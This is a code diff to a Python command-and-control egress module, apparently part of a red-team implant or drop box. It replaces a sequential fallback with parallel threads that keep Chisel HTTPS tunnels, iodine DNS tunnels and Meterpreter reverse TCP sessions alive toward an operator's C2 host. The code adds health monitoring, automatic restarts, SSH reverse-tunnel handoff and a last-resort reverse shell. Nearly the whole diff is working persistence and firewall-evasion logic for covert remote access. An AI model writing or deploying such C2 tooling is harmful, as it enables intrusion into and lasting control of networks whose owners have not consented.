@@ -1,20 +1,22 @@
 #!/usr/bin/env python3
-"""C2 egress cascade.
+"""C2 egress — parallel multi-method connections.
 
-Attempts to establish a command-and-control channel back to the
-operator's infrastructure, trying methods from most-likely-to-succeed
-to least:
+Establishes command-and-control channels back to the operator's
+infrastructure.  All enabled methods run simultaneously, each in its
+own management thread with automatic health monitoring and restart:
 
-    1. DNS Tunnel (iodine)  — UDP/53, almost universally permitted
-    2. Python Meterpreter   — reverse TCP on 4443/8443
-    3. Raw Reverse Shell    — fallback if meterpreter staging fails
+    1. Chisel HTTPS tunnel  — WebSocket/TLS on 443 (primary)
+    2. DNS Tunnel (iodine)  — UDP/53
+    3. Python Meterpreter   — reverse TCP on 4443/8443
 
-Each method is attempted in sequence.  On failure the cascade
-continues.  On total failure, the cascade retries after a
-configurable delay.
+Reverse shell is a last resort — attempted only when all three
+parallel methods stay failed for 5 minutes.
+
+Legacy sequential cascade (run_cascade) is still available.
 """
 
 import base64
+import datetime
 import json
 import logging
 import os
@@ -55,6 +57,43 @@ _chisel_stderr_lines = []      # Ongoing stderr capture for health checks
 _watchdog_stop = threading.Event()
 _exec_kill_event = threading.Event()  # Signal for killing meterpreter exec thread
 
+# ── Parallel C2 State ──────────────────────────────────────────
+_parallel_shutdown = threading.Event()
+_method_states_lock = threading.Lock()
+_method_states = {}
+
+
+def _update_method_state(method, state, **kwargs):
+    with _method_states_lock:
+        if method not in _method_states:
+            _method_states[method] = {"state": "idle", "pid": None, "since": None}
+        entry = _method_states[method]
+        prev = entry.get("state")
+        entry["state"] = state
+        if state != prev:
+            entry["since"] = datetime.datetime.now().isoformat()
+        for k, v in kwargs.items():
+            entry[k] = v
+
+
+def get_method_states():
+    with _method_states_lock:
+        return {k: dict(v) for k, v in _method_states.items()}
+
+
+def get_aggregate_state():
+    with _method_states_lock:
+        states = [v["state"] for v in _method_states.values()]
+    if not states:
+        return EgressState.IDLE
+    if "connected" in states:
+        return EgressState.CONNECTED
+    if "attempting" in states:
+        return EgressState.ATTEMPTING
+    if all(s == "failed" for s in states):
+        return EgressState.FAILED
+    return EgressState.IDLE
+
 
 def _resolve_device_id(config):
     """Look up this appliance's device_id from the device registry.
@@ -92,6 +131,7 @@ def force_shutdown():
     global _current_state, _meterpreter_socket
     _current_state = EgressState.FAILED
     _watchdog_stop.set()
+    _parallel_shutdown.set()
     _exec_kill_event.set()
 
     # Kill SSH reverse tunnels
@@ -489,6 +529,7 @@ def try_chisel(config):
         _c2_method = "chisel"
         _current_state = EgressState.CONNECTED
 
+        _update_method_state("chisel", "connected", pid=proc.pid)
         log.info("Chisel connected to %s (pid=%d, device_id=%d)",
                  server_url, proc.pid, device_id)
         for fwd in forwards:
@@ -612,6 +653,7 @@ def try_dns_tunnel(config):
             if _dns_tunnel_up():
                 _c2_process = proc
                 _c2_method = "dns_tunnel"
+                _update_method_state("dns_tunnel", "connected", pid=proc.pid)
                 log.info("DNS tunnel established on dns0")
                 return True
 
@@ -852,6 +894,7 @@ def try_meterpreter(c2_host, ports, connect_timeout=10, retry_delay=5,
 
             _c2_method = "meterpreter"
             _meterpreter_socket = s
+            _update_method_state("meterpreter", "connected", pid=os.getpid())
 
             # Clear the staging timeout — the meterpreter dispatch
             # loop needs blocking I/O (or sets its own timeouts)
@@ -1093,15 +1136,30 @@ def try_meterpreter(c2_host, ports, connect_timeout=10, retry_delay=5,
                         and _poll_tick * _WATCHDOG_INTERVAL
                         >= _SSH_STABILIZE_DELAY
                         and t.is_alive()):
-                    _ssh_started = True
-                    log.info("Meterpreter stable for %ds — starting "
-                             "SSH reverse tunnels", _SSH_STABILIZE_DELAY)
-                    _start_ssh_tunnels(
-                        c2_host, _tunnel_cfg)
+                    with _method_states_lock:
+                        _chisel_up = _method_states.get(
+                            "chisel", {}).get("state") == "connected"
+                    if _chisel_up:
+                        log.info("Chisel connected — SSH tunnels "
+                                 "not needed (chisel handles ports)")
+                    else:
+                        _ssh_started = True
+                        log.info("Meterpreter stable for %ds — "
+                                 "starting SSH reverse tunnels",
+                                 _SSH_STABILIZE_DELAY)
+                        _start_ssh_tunnels(c2_host, _tunnel_cfg)
 
                 # ── Check SSH tunnel health ─────────────────────
                 if _ssh_started and _ssh_tunnel_proc is not None:
-                    if _ssh_tunnel_proc.poll() is not None:
+                    with _method_states_lock:
+                        _chisel_up = _method_states.get(
+                            "chisel", {}).get("state") == "connected"
+                    if _chisel_up:
+                        log.info("Chisel now connected — stopping "
+                                 "SSH tunnels (chisel has priority)")
+                        _stop_ssh_tunnels()
+                        _ssh_started = False
+                    elif _ssh_tunnel_proc.poll() is not None:
                         _rc = _ssh_tunnel_proc.returncode
                         log.warning("SSH tunnel process died (rc=%d) "
                                     "— restarting", _rc)
@@ -1271,7 +1329,178 @@ def _recv_exact(sock, n):
         data += chunk
     return data
 
-# ── Egress Cascade ──────────────────────────────────────────────
+# ── Parallel C2 Management Threads ────────────────────────────
+
+def _manage_chisel(config):
+    retry_delay = 30
+    while not _parallel_shutdown.is_set():
+        _update_method_state("chisel", "attempting")
+        result = try_chisel(config)
+        if result:
+            while not _parallel_shutdown.is_set():
+                _parallel_shutdown.wait(10)
+                if _parallel_shutdown.is_set():
+                    break
+                if not chisel_is_alive():
+                    log.warning("Chisel process died — will retry")
+                    _stop_chisel()
+                    break
+                disconnect = False
+                for line in list(_chisel_stderr_lines):
+                    if "Disconnected" in line or "Give up" in line:
+                        log.warning("Chisel disconnect: %s", line)
+                        _stop_chisel()
+                        disconnect = True
+                        break
+                if disconnect:
+                    break
+        _update_method_state("chisel", "failed")
+        if not _parallel_shutdown.is_set():
+            _parallel_shutdown.wait(retry_delay)
+
+
+def _manage_dns_tunnel(config):
+    retry_delay = 30
+    dns_cfg = config.get("dns_tunnel", {})
+    while not _parallel_shutdown.is_set():
+        _update_method_state("dns_tunnel", "attempting")
+        result = try_dns_tunnel(dns_cfg)
+        if result:
+            while not _parallel_shutdown.is_set():
+                _parallel_shutdown.wait(15)
+                if _parallel_shutdown.is_set():
+                    break
+                if not _dns_tunnel_up():
+                    log.warning("DNS tunnel interface dropped — will retry")
+                    break
+                if _c2_process and _c2_process.poll() is not None:
+                    log.warning("iodine process exited — will retry")
+                    break
+        _update_method_state("dns_tunnel", "failed")
+        if not _parallel_shutdown.is_set():
+            _parallel_shutdown.wait(retry_delay)
+
+
+def _manage_meterpreter(config):
+    c2_host = config["c2"]["host"]
+    c2_ports = config["c2"]["ports"]
+    met_cfg = config.get("meterpreter", {})
+    device_id = _resolve_device_id(config)
+    tunnel_cfg = config.get("ssh_tunnels")
+    if tunnel_cfg is not None:
+        tunnel_cfg = dict(tunnel_cfg)
+        tunnel_cfg["_device_id"] = device_id
+
+    proxy = None
+    proxy_host = config.get("_detected_proxy_host")
+    proxy_port = config.get("_detected_proxy_port")
+    if proxy_host and proxy_port:
+        proxy = (proxy_host, proxy_port)
+
+    retry_delay = 60
+    while not _parallel_shutdown.is_set():
+        _update_method_state("meterpreter", "attempting")
+        result = try_meterpreter(
+            c2_host, c2_ports,
+            connect_timeout=met_cfg.get("connect_timeout", 10),
+            retry_delay=met_cfg.get("retry_delay", 5),
+            proxy=proxy,
+            tunnel_cfg=tunnel_cfg,
+        )
+        _update_method_state("meterpreter", "failed")
+        if not _parallel_shutdown.is_set():
+            _parallel_shutdown.wait(retry_delay)
+
+
+def run_parallel(config):
+    """Run all enabled C2 methods in parallel.
+
+    Each method gets its own management thread that handles connection,
+    health monitoring, and automatic restart.  Reverse shell is attempted
+    only as a last resort when all parallel methods stay failed for
+    5 minutes.
+
+    Blocks until force_shutdown() is called (SIGTERM/SIGINT).
+    """
+    _parallel_shutdown.clear()
+
+    chisel_cfg = config.get("chisel", {})
+    dns_cfg = config.get("dns_tunnel", {})
+    met_cfg = config.get("meterpreter", {})
+
+    with _method_states_lock:
+        _method_states.clear()
+
+    threads = []
+
+    if chisel_cfg.get("enabled", False):
+        _update_method_state("chisel", "idle")
+        t = threading.Thread(target=_manage_chisel, args=(config,),
+                             daemon=True, name="manage-chisel")
+        threads.append(t)
+
+    if dns_cfg.get("enabled", True):
+        _update_method_state("dns_tunnel", "idle")
+        t = threading.Thread(target=_manage_dns_tunnel, args=(config,),
+                             daemon=True, name="manage-dns-tunnel")
+        threads.append(t)
+
+    if met_cfg.get("enabled", True):
+        _update_method_state("meterpreter", "idle")
+        t = threading.Thread(target=_manage_meterpreter, args=(config,),
+                             daemon=True, name="manage-meterpreter")
+        threads.append(t)
+
+    if not threads:
+        log.error("No C2 methods enabled — nothing to do")
+        return
+
+    for t in threads:
+        t.start()
+
+    log.info("Parallel C2 started: %d method(s)", len(threads))
+
+    c2_host = config["c2"]["host"]
+    c2_ports = config["c2"]["ports"]
+    proxy = None
+    proxy_host = config.get("_detected_proxy_host")
+    proxy_port = config.get("_detected_proxy_port")
+    if proxy_host and proxy_port:
+        proxy = (proxy_host, proxy_port)
+
+    last_resort_timeout = 300
+    all_failed_since = None
+
+    while not _parallel_shutdown.is_set():
+        _parallel_shutdown.wait(10)
+        if _parallel_shutdown.is_set():
+            break
+
+        agg = get_aggregate_state()
+
+        if agg in (EgressState.CONNECTED, EgressState.ATTEMPTING):
+            all_failed_since = None
+            continue
+
+        if agg == EgressState.FAILED:
+            if all_failed_since is None:
+                all_failed_since = time.monotonic()
+                log.warning("All parallel C2 methods failed — "
+                            "reverse shell in %ds if no recovery",
+                            last_resort_timeout)
+            elif time.monotonic() - all_failed_since >= last_resort_timeout:
+                log.warning("All methods failed for %ds — "
+                            "attempting reverse shell (last resort)",
+                            last_resort_timeout)
+                try_reverse_shell(c2_host, c2_ports, proxy=proxy)
+                all_failed_since = None
+
+    log.info("Parallel C2 shutting down")
+    for t in threads:
+        t.join(timeout=5)
+
+
+# ── Sequential Egress Cascade (legacy) ────────────────────────
 
 def run_cascade(config):
     """Run the full C2 egress cascade.
